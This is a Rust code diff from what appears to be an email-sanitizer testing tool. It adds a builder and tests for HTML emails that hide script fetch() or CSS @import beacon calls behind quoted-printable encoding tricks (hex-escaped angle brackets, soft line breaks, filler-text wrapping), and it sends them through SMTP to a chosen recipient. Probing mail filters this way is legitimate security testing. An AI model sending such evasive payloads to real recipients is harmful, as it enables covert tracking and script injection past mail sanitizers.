@@ -1675,6 +1675,118 @@ mod technique_message_tests {
 }
 
 #[cfg(test)]
+mod build_filler_text_tests {
+    use super::build_filler_text;
+
+    #[test]
+    fn produces_exactly_the_requested_character_count() {
+        for &n in &[1u32, 10, 50, 200, 731] {
+            let text = build_filler_text(n);
+            assert_eq!(text.chars().count() as u32, n, "wrong length for target {n}");
+        }
+    }
+
+    #[test]
+    fn starts_with_the_polish_pangram() {
+        // Repeats/truncates the pangram sentence rather than generating
+        // arbitrary filler - a long-enough request should still start
+        // with recognizable Polish text, not just repeated placeholder
+        // characters.
+        let text = build_filler_text(20);
+        assert!(text.starts_with("Zażółć gęślą jaźń"));
+    }
+}
+
+#[cfg(test)]
+mod build_custom_technique_message_tests {
+    use super::build_custom_technique_message;
+
+    const FROM: &str = "tester@example.com";
+    const TO: &str = "victim@example.com";
+    const SUBJECT: &str = "Sanitization test";
+    const BEACON: &str = "https://beacon.example/hit/abc123-custom";
+
+    fn as_text(bytes: &[u8]) -> String {
+        String::from_utf8_lossy(bytes).into_owned()
+    }
+
+    #[test]
+    fn unknown_vector_is_rejected() {
+        assert!(build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "not-a-vector", "hex-both", None).is_err());
+    }
+
+    #[test]
+    fn unknown_mechanism_is_rejected() {
+        assert!(build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "not-a-mechanism", None).is_err());
+    }
+
+    #[test]
+    fn script_hex_both_matches_the_fixed_qp_hex_escaped_tags_shape() {
+        let bytes = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "hex-both", None).unwrap();
+        let text = as_text(&bytes);
+        assert!(!text.contains("<script"));
+        assert!(text.contains("=3Cscript=3E"));
+        assert!(text.contains("=3C/script=3E"));
+    }
+
+    #[test]
+    fn style_hex_open_leaves_the_closing_bracket_literal() {
+        let bytes = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "style", "hex-open", None).unwrap();
+        let text = as_text(&bytes);
+        assert!(!text.contains("<style"));
+        assert!(text.contains("=3Cstyle>"));
+        assert!(text.contains("=3C/style>"));
+        assert!(text.contains("@import"));
+    }
+
+    #[test]
+    fn script_hex_close_leaves_the_opening_bracket_literal() {
+        let bytes = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "hex-close", None).unwrap();
+        let text = as_text(&bytes);
+        assert!(text.contains("<script"));
+        assert!(!text.contains("<script>"));
+        assert!(text.contains("script=3E"));
+    }
+
+    #[test]
+    fn style_soft_break_never_shows_style_unbroken() {
+        let bytes = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "style", "soft-break", None).unwrap();
+        let text = as_text(&bytes);
+        assert!(!text.contains("<style"));
+        assert!(!text.contains("</style"));
+        assert!(text.contains("@import"));
+    }
+
+    #[test]
+    fn natural_wrap_uses_the_provided_filler_text() {
+        let short = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "natural-wrap", Some("short")).unwrap();
+        let long = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "natural-wrap", Some(&"a very much longer filler sentence ".repeat(10))).unwrap();
+        // A longer requested filler must produce a longer message body -
+        // proves filler_text actually reaches the encoder, not silently
+        // ignored in favor of some fixed default.
+        assert!(long.len() > short.len());
+        assert!(as_text(&short).contains("Content-Transfer-Encoding: quoted-printable"));
+        assert!(as_text(&short).contains("short"));
+    }
+
+    #[test]
+    fn natural_wrap_defaults_and_clamps_filler_text() {
+        // None (and an all-whitespace/empty string) fall back to a sane
+        // generated default rather than erroring or producing an empty
+        // filler.
+        assert!(build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "natural-wrap", None).is_ok());
+        assert!(build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "natural-wrap", Some("   ")).is_ok());
+        // An absurdly long pasted filler is clamped by character count,
+        // not left to build a runaway-sized email.
+        let huge_input = "x".repeat(1_000_000);
+        let huge = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "natural-wrap", Some(&huge_input)).unwrap();
+        let clamped_input = "x".repeat(2000);
+        let clamped = build_custom_technique_message(FROM, TO, SUBJECT, BEACON, "script", "natural-wrap", Some(&clamped_input)).unwrap();
+        assert_eq!(huge.len(), clamped.len());
+    }
+}
+
+#[cfg(test)]
 mod format_rfc5322_date_tests {
     use super::format_rfc5322_date;
 
@@ -5545,6 +5657,85 @@ fn build_technique_message(from: &str, to: &str, subject: &str, beacon_url: &str
     }
 }
 
+fn finish_qp_message(from: &str, to: &str, subject: &str, beacon_url: &str, body: &str) -> Vec<u8> {
+    let message = format!(
+        "{headers}Content-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n{body}\r\n",
+        headers = technique_message_headers(from, to, subject, beacon_url),
+        body = body
+    );
+    message.into_bytes()
+}
+
+// Same Polish pangram used by the fixed qp-* techniques above, repeated
+// and truncated to an exact character count - lets the LS panel's custom
+// technique builder sweep ANY filler length the user types in, rather
+// than only the 10 fixed qp-natural-wrap-N offsets.
+fn build_filler_text(target_len: u32) -> String {
+    let base = "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj. ";
+    let mut out = String::new();
+    while (out.chars().count() as u32) < target_len {
+        out.push_str(base);
+    }
+    out.chars().take(target_len as usize).collect()
+}
+
+// Generic version of the fixed qp-soft-break(-style)/qp-hex-*(-style-tags)
+// pairs above - instead of one hand-written Rust function per (vector,
+// mechanism) combination, the LS panel's "Custom technique builder" lets
+// the user pick both freely (plus, for natural-wrap, the exact filler
+// text itself - editable/pasteable, not just a length) without needing a
+// new hardcoded technique/checkbox for every combination anyone might
+// want to try.
+fn build_custom_technique_message(
+    from: &str,
+    to: &str,
+    subject: &str,
+    beacon_url: &str,
+    vector: &str,
+    mechanism: &str,
+    filler_text: Option<&str>,
+) -> Result<Vec<u8>, String> {
+    let (tag_name, inner) = match vector {
+        "script" => ("script", format!("fetch('{}').catch(function(){{}})", beacon_url)),
+        "style" => ("style", format!("@import \"{}\";", beacon_url)),
+        other => return Err(format!("Unknown vector: {other}")),
+    };
+
+    let body = match mechanism {
+        "soft-break" => {
+            // Splits the tag name itself roughly in half with a soft line
+            // break, same mechanic as build_qp_soft_break_message/
+            // build_qp_soft_break_style_message, generalized to whichever
+            // tag_name the chosen vector uses.
+            let mid = tag_name.len() / 2;
+            let (a, b) = tag_name.split_at(mid);
+            let pangram_encoded = quoted_printable_encode("Zażółć gęślą jaźń");
+            format!("<p>{pangram_encoded}</p><p>Test:</p><{a}=\r\n{b}>{inner}</{a}=\r\n{b}>")
+        }
+        "hex-open" => format!("<p>Test:</p>=3C{tag_name}>{inner}=3C/{tag_name}>"),
+        "hex-close" => format!("<p>Test:</p><{tag_name}=3E{inner}</{tag_name}=3E"),
+        "hex-both" => format!("<p>Test:</p>=3C{tag_name}=3E{inner}=3C/{tag_name}=3E"),
+        "natural-wrap" => {
+            // The LS panel shows an editable textarea pre-filled with a
+            // generated preview (same content build_filler_text below
+            // produces) that the user can freely retype or paste over -
+            // falls back to that same generator if left empty, and is
+            // truncated by CHARACTER count (not byte count, so a Polish
+            // diacritic never gets split mid-codepoint) to avoid an
+            // absurdly large email from an accidental huge paste.
+            let filler = match filler_text.map(str::trim).filter(|s| !s.is_empty()) {
+                Some(s) => s.chars().take(2000).collect::<String>(),
+                None => build_filler_text(50),
+            };
+            let raw_html = format!("<p>{filler} <{tag_name}>{inner}</{tag_name}></p>");
+            quoted_printable_encode_folded(&raw_html)
+        }
+        other => return Err(format!("Unknown mechanism: {other}")),
+    };
+
+    Ok(finish_qp_message(from, to, subject, beacon_url, &body))
+}
+
 #[tauri::command]
 async fn send_encoding_test_email(
     gmail_address: String,
@@ -5556,7 +5747,36 @@ async fn send_encoding_test_email(
     smtp_host: Option<String>,
 ) -> Result<(), String> {
     let raw_message = build_technique_message(&gmail_address, &to, &subject, &beacon_url, &technique)?;
+    send_raw_message_via_smtp(gmail_address, app_password, to, raw_message, smtp_host).await
+}
 
+#[tauri::command]
+async fn send_custom_technique_email(
+    gmail_address: String,
+    app_password: String,
+    to: String,
+    subject: String,
+    beacon_url: String,
+    vector: String,
+    mechanism: String,
+    filler_text: Option<String>,
+    smtp_host: Option<String>,
+) -> Result<(), String> {
+    let raw_message = build_custom_technique_message(&gmail_address, &to, &subject, &beacon_url, &vector, &mechanism, filler_text.as_deref())?;
+    send_raw_message_via_smtp(gmail_address, app_password, to, raw_message, smtp_host).await
+}
+
+// Shared envelope/mailer glue for both send_encoding_test_email above and
+// send_custom_technique_email below - identical for either, only the raw
+// message bytes differ (build_technique_message's fixed presets vs.
+// build_custom_technique_message's user-configured vector/mechanism).
+async fn send_raw_message_via_smtp(
+    gmail_address: String,
+    app_password: String,
+    to: String,
+    raw_message: Vec<u8>,
+    smtp_host: Option<String>,
+) -> Result<(), String> {
     let from_addr: lettre::Address = gmail_address.parse().map_err(|e: lettre::address::AddressError| e.to_string())?;
     let to_addr: lettre::Address = to.parse().map_err(|e: lettre::address::AddressError| e.to_string())?;
     let envelope = lettre::address::Envelope::new(Some(from_addr), vec![to_addr]).map_err(|e| e.to_string())?;
@@ -6087,6 +6307,7 @@ fn main() {
             stop_tunnel,
             send_test_email,
             send_encoding_test_email,
+            send_custom_technique_email,
             start_browser_proxy,
             stop_browser_proxy,
             get_browser_network_hits,
